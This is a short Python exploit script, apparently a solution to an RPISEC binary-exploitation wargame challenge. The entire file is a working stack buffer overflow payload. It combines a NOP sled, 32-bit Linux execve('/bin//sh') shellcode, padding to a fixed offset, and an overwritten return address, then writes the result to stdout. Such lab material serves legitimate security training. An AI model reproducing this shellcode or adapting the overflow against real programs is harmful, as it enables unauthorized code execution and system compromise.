#!/usr/bin/env python
# th3r3_iz_n0_4dm1ns_0n1y_U!

import sys, struct

sc  = "\x90\x90\x90\x90\x90"
sc += "\x90\x90\x90\x90\x90"
sc += "\x90\x90\x90\x90\x90"
sc += (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

offset  = "A" * (329-len(sc))
retADDR = struct.pack('<L', 0x08049c46)
trigger = "C" * (500 - (
  len(retADDR) +
  len(offset)
  )
)


payload  = "rpisec"
payload += sc + offset + retADDR + trigger

sys.stdout.write(payload)
